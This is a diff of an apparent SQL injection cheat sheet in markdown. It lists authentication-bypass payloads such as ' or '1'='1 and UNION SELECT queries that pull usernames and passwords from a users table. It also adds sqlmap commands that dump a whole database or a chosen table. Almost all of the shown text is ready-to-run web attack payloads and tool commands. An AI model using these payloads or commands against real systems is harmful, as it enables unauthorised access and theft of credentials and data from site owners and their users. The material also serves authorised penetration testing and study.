@@ -87,13 +87,19 @@ More SQLi cheatsheets: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-
 * ^Combines customer and suppliers names in one table, displaying distinct rows only.
 * `UNION ALL` is the same but displays all rows.  
 
-**Exploitation: Authentication Bypass (MySQL)**  
+**Exploitation**  
 
+Authentication Bypass
 ```SQL
 ' or '1'='1
 ' UNION ALL SELECT CURRENT_USER, '1
 ' UNION ALL SELECT name,pass FROM users WHERE name="noone"--    # whitespace needed after -- comment
 ```
+
+Sqlmap: Dump everything + level 4 tests + 10 threads.  
+`python sqlmap.py -u https://example.com/?id=1 -a --level=4 --threads=10`  
+Sqlmap: Dump a specific table within a database  
+`python sqlmap.py -u https://example.com/?id=1 --dump -D DATABASE -T TABLENAME`  
 
 
 
